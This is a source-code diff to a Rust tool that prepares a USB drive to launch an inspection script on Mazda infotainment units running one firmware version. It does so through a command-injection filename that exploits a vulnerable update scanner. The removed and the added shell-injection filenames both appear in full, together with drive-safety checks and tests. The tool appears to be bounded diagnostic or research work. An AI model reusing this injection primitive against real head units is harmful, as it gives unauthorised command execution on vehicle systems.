@@ -18,13 +18,34 @@ use std::process::Command;
 /// The only firmware family on which the USB launcher is currently allowed to run.
 pub const SUPPORTED_FIRMWARE: &str = "74.00.324A";
 
-/// The command-injection filename consumed by the vulnerable Gen-6.5 update scanner.
-///
-/// FAT filenames cannot contain `/`, so the command obtains the root path from the scanner's
-/// established `HOME=/root` environment and checks each stock removable-media mount. The command
-/// can only invoke the fixed `cmu-inspect.sh` filename.
-pub const LAUNCHER_FILE_NAME: &str =
-    "$(R=${HOME%root};for V in a b c d;do P=${R}tmp${R}mnt${R}sd${V}1${R}cmu-inspect.sh;[ -f $P ]&&sh $P&&break;done).up";
+/// A single, explicitly selected stock removable-media mount.
+#[derive(Debug, Clone, Copy, PartialEq, Eq)]
+pub enum CmuMount {
+    Sda1,
+    Sdb1,
+}
+
+impl CmuMount {
+    #[must_use]
+    pub const fn as_str(self) -> &'static str {
+        match self {
+            Self::Sda1 => "sda1",
+            Self::Sdb1 => "sdb1",
+        }
+    }
+}
+
+impl std::str::FromStr for CmuMount {
+    type Err = ();
+
+    fn from_str(value: &str) -> Result<Self, Self::Err> {
+        match value {
+            "sda1" => Ok(Self::Sda1),
+            "sdb1" => Ok(Self::Sdb1),
+            _ => Err(()),
+        }
+    }
+}
 
 const COLLECTOR_FILE_NAME: &str = "cmu-inspect.sh";
 const UPDATE_FLAG_FILE_NAME: &str = "jci-autoupdate";
@@ -42,7 +63,9 @@ pub enum PrepareError {
     DestinationOutsideMacVolumes,
     DestinationNotFat32,
     DestinationNotRemovable,
+    DestinationNotMbr,
     DestinationNotEmpty(String),
+    UnexpectedPostWriteEntry(String),
     Io {
         action: &'static str,
         path: PathBuf,
@@ -75,9 +98,16 @@ impl fmt::Display for PrepareError {
             Self::DestinationNotRemovable => {
                 write!(formatter, "destination volume is not removable media")
             }
+            Self::DestinationNotMbr => {
+                write!(formatter, "destination disk does not use an MBR partition map")
+            }
             Self::DestinationNotEmpty(name) => write!(
                 formatter,
                 "destination contains non-macOS-metadata entry {name:?}; use a blank FAT32 drive"
+            ),
+            Self::UnexpectedPostWriteEntry(name) => write!(
+                formatter,
+                "unexpected entry {name:?} appeared while preparing the drive; payload was rolled back"
             ),
             Self::Io {
                 action,
@@ -193,7 +223,11 @@ impl std::error::Error for AnalyzeError {
 ///
 /// Returns an error when the firmware was not explicitly confirmed, the destination is unsafe or
 /// non-empty, or any payload file cannot be created and flushed.
-pub fn prepare_usb(destination: &Path, confirmed_firmware: &str) -> Result<(), PrepareError> {
+pub fn prepare_usb(
+    destination: &Path,
+    confirmed_firmware: &str,
+    cmu_mount: CmuMount,
+) -> Result<(), PrepareError> {
     if confirmed_firmware != SUPPORTED_FIRMWARE {
         return Err(PrepareError::UnsupportedFirmware);
     }
@@ -229,10 +263,11 @@ pub fn prepare_usb(destination: &Path, confirmed_firmware: &str) -> Result<(), P
         }
     }
 
+    let launcher_file_name = launcher_file_name(cmu_mount);
     let payloads: [(&str, &[u8]); 3] = [
         (COLLECTOR_FILE_NAME, COLLECTOR),
         (UPDATE_FLAG_FILE_NAME, b"\n"),
-        (LAUNCHER_FILE_NAME, b"\n"),
+        (&launcher_file_name, b"\n"),
     ];
     let mut created = Vec::with_capacity(payloads.len());
 
@@ -246,7 +281,44 @@ pub fn prepare_usb(destination: &Path, confirmed_firmware: &str) -> Result<(), P
         created.push(path);
     }
 
+    if let Err(error) = verify_prepared_entries(destination, &launcher_file_name) {
+        rollback_created_files(&created);
+        return Err(error);
+    }
+
     Ok(())
+}
+
+fn verify_prepared_entries(destination: &Path, launcher: &str) -> Result<(), PrepareError> {
+    let entries = fs::read_dir(destination)
+        .map_err(|error| io_error("verify prepared drive", destination, error))?;
+    for entry in entries {
+        let entry = entry.map_err(|error| io_error("verify prepared drive", destination, error))?;
+        let name = entry.file_name();
+        let is_payload = name == OsStr::new(COLLECTOR_FILE_NAME)
+            || name == OsStr::new(UPDATE_FLAG_FILE_NAME)
+            || name == OsStr::new(launcher);
+        if !is_payload && !is_ignorable_macos_metadata(&name) {
+            return Err(PrepareError::UnexpectedPostWriteEntry(
+                name.to_string_lossy().into_owned(),
+            ));
+        }
+    }
+    Ok(())
+}
+
+/// Builds the one command-injection filename used by the vulnerable Gen-6.5 update scanner.
+///
+/// This implementation is independently derived from ZDI's published filename-injection
+/// primitive. FAT disallows a literal `/`, so standard shell built-ins derive `/` by moving from
+/// `HOME` to its parent. Unlike community launchers, this names exactly one caller-selected mount
+/// and contains no mount-search loop or arbitrary command input.
+#[must_use]
+pub fn launcher_file_name(cmu_mount: CmuMount) -> String {
+    format!(
+        "$(R=$(cd ${{HOME}};cd ..;pwd);sh ${{R}}tmp${{R}}mnt${{R}}{}${{R}}cmu-inspect.sh).up",
+        cmu_mount.as_str()
+    )
 }
 
 /// Validates and analyzes a completed `mazda-cmu-report` directory.
@@ -521,23 +593,61 @@ fn verify_macos_volume(destination: &Path) -> Result<(), PrepareError> {
         ));
     }
 
-    let plist = String::from_utf8_lossy(&output.stdout);
-    if !plist_value_starts_with(&plist, "FilesystemType", "<string>msdos</string>") {
-        return Err(PrepareError::DestinationNotFat32);
-    }
-    if !plist_value_starts_with(&plist, "RemovableMedia", "<true/>") {
-        return Err(PrepareError::DestinationNotRemovable);
+    let volume_plist = String::from_utf8_lossy(&output.stdout);
+    let parent_disk = plist_string_value(&volume_plist, "ParentWholeDisk")
+        .ok_or(PrepareError::DestinationNotMbr)?;
+
+    let disk_output = Command::new("/usr/sbin/diskutil")
+        .args(["list", "-plist", parent_disk])
+        .output()
+        .map_err(|error| io_error("inspect partition map with diskutil", destination, error))?;
+    if !disk_output.status.success() {
+        return Err(io_error(
+            "inspect partition map with diskutil",
+            destination,
+            io::Error::other("diskutil returned a failure status"),
+        ));
     }
 
-    Ok(())
+    validate_macos_volume_plists(&volume_plist, &String::from_utf8_lossy(&disk_output.stdout))
 }
 
-#[cfg(target_os = "macos")]
+#[cfg(any(target_os = "macos", test))]
 fn plist_value_starts_with(plist: &str, key: &str, expected_value: &str) -> bool {
     let marker = format!("<key>{key}</key>");
     plist
         .split_once(&marker)
         .is_some_and(|(_, remainder)| remainder.trim_start().starts_with(expected_value))
+}
+
+#[cfg(any(target_os = "macos", test))]
+fn plist_string_value<'a>(plist: &'a str, key: &str) -> Option<&'a str> {
+    let marker = format!("<key>{key}</key>");
+    let (_, remainder) = plist.split_once(&marker)?;
+    let remainder = remainder.trim_start().strip_prefix("<string>")?;
+    remainder.split_once("</string>").map(|(value, _)| value)
+}
+
+#[cfg(any(target_os = "macos", test))]
+fn validate_macos_volume_plists(
+    volume_plist: &str,
+    whole_disk_plist: &str,
+) -> Result<(), PrepareError> {
+    let filesystem_type = plist_string_value(volume_plist, "FilesystemType");
+    let filesystem_name = plist_string_value(volume_plist, "FilesystemName");
+    if filesystem_type != Some("msdos")
+        || !filesystem_name.is_some_and(|name| name.to_ascii_uppercase().contains("FAT32"))
+    {
+        return Err(PrepareError::DestinationNotFat32);
+    }
+    if !plist_value_starts_with(volume_plist, "RemovableMedia", "<true/>") {
+        return Err(PrepareError::DestinationNotRemovable);
+    }
+    if plist_string_value(whole_disk_plist, "Content") != Some("FDisk_partition_scheme") {
+        return Err(PrepareError::DestinationNotMbr);
+    }
+
+    Ok(())
 }
 
 #[cfg(test)]
@@ -581,7 +691,7 @@ mod tests {
     fn prepares_exact_payload_without_overwriting() {
         let usb = TestDirectory::new("prepare");
 
-        prepare_usb(&usb.0, SUPPORTED_FIRMWARE).expect("prepare payload");
+        prepare_usb(&usb.0, SUPPORTED_FIRMWARE, CmuMount::Sda1).expect("prepare payload");
 
         assert_eq!(
             fs::read(usb.0.join(COLLECTOR_FILE_NAME)).expect("read collector"),
@@ -591,31 +701,70 @@ mod tests {
             fs::read(usb.0.join(UPDATE_FLAG_FILE_NAME)).expect("read flag"),
             b"\n"
         );
-        assert!(usb.0.join(LAUNCHER_FILE_NAME).is_file());
+        let launcher = launcher_file_name(CmuMount::Sda1);
+        assert!(usb.0.join(&launcher).is_file());
         assert!(matches!(
-            prepare_usb(&usb.0, SUPPORTED_FIRMWARE),
+            prepare_usb(&usb.0, SUPPORTED_FIRMWARE, CmuMount::Sda1),
             Err(PrepareError::DestinationNotEmpty(_))
         ));
     }
 
     #[test]
     fn launcher_name_is_a_single_valid_fat_component() {
-        assert!(LAUNCHER_FILE_NAME.len() <= 255);
-        assert!(!LAUNCHER_FILE_NAME.chars().any(|character| matches!(
+        let launcher = launcher_file_name(CmuMount::Sdb1);
+        assert!(launcher.len() <= 255);
+        assert!(!launcher.chars().any(|character| matches!(
             character,
             '<' | '>' | ':' | '"' | '/' | '\\' | '|' | '?' | '*'
         )));
-        assert!(Path::new(LAUNCHER_FILE_NAME)
+        assert!(Path::new(&launcher)
             .extension()
             .is_some_and(|extension| extension.eq_ignore_ascii_case("up")));
-        assert!(LAUNCHER_FILE_NAME.contains("cmu-inspect.sh"));
+        assert!(launcher.contains("sdb1"));
+        assert!(launcher.contains("cmu-inspect.sh"));
+        assert!(!launcher.contains("for "));
+        assert!(!launcher.contains("HOME%root"));
+    }
+
+    #[test]
+    fn diskutil_plists_require_fat32_removable_media_and_mbr() {
+        let volume = r"
+            <plist><dict>
+            <key>FilesystemType</key><string>msdos</string>
+            <key>FilesystemName</key><string>MS-DOS FAT32</string>
+            <key>ParentWholeDisk</key><string>disk7</string>
+            <key>RemovableMedia</key><true/>
+            </dict></plist>
+        ";
+        let mbr = r"
+            <plist><dict><key>AllDisksAndPartitions</key><array><dict>
+            <key>Content</key><string>FDisk_partition_scheme</string>
+            </dict></array></dict></plist>
+        ";
+        assert!(validate_macos_volume_plists(volume, mbr).is_ok());
+
+        let fat16 = volume.replace("FAT32", "FAT16");
+        assert!(matches!(
+            validate_macos_volume_plists(&fat16, mbr),
+            Err(PrepareError::DestinationNotFat32)
+        ));
+        let fixed = volume.replace("<true/>", "<false/>");
+        assert!(matches!(
+            validate_macos_volume_plists(&fixed, mbr),
+            Err(PrepareError::DestinationNotRemovable)
+        ));
+        let guid = mbr.replace("FDisk_partition_scheme", "GUID_partition_scheme");
+        assert!(matches!(
+            validate_macos_volume_plists(volume, &guid),
+            Err(PrepareError::DestinationNotMbr)
+        ));
     }
 
     #[test]
     fn refuses_unconfirmed_firmware_before_writing() {
         let usb = TestDirectory::new("firmware");
 
-        let result = prepare_usb(&usb.0, "70.00.100A");
+        let result = prepare_usb(&usb.0, "70.00.100A", CmuMount::Sda1);
 
         assert!(matches!(result, Err(PrepareError::UnsupportedFirmware)));
         assert_eq!(fs::read_dir(&usb.0).expect("list USB").count(), 0);
@@ -625,7 +774,7 @@ mod tests {
     fn collector_is_firmware_gated_bounded_and_usb_only() {
         let usb = TestDirectory::new("collector-usb");
         let root = TestDirectory::new("collector-root");
-        prepare_usb(&usb.0, SUPPORTED_FIRMWARE).expect("prepare payload");
+        prepare_usb(&usb.0, SUPPORTED_FIRMWARE, CmuMount::Sda1).expect("prepare payload");
         root.write(
             "jci/version.ini",
             b"JCI_SW_VER=\"cmu150_NA_74.00.324\"\r\nJCI_SW_VER_PATCH=\"A\"\r\n",
@@ -688,7 +837,7 @@ mod tests {
     fn collector_refuses_other_firmware_without_creating_report() {
         let usb = TestDirectory::new("refusal-usb");
         let root = TestDirectory::new("refusal-root");
-        prepare_usb(&usb.0, SUPPORTED_FIRMWARE).expect("prepare payload");
+        prepare_usb(&usb.0, SUPPORTED_FIRMWARE, CmuMount::Sda1).expect("prepare payload");
         root.write("jci/version.ini", b"JCI_SW_VER=\"cmu150_NA_74.00.331\"\n");
 
         let output = Command::new("sh")
